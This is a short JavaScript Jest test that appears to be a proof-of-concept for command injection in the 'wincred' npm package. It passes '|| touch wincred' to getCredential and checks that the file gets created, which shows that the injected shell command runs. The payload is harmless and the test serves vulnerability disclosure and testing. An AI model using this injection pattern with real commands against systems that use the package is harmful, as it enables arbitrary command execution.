test("Command Injection in wincred", () => {
  expect.assertions(2);
  const wincred = require("wincred");
  const fs = require("fs");
  const path = "./wincred";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return wincred.getCredential("|| touch wincred").finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {});
  });
});
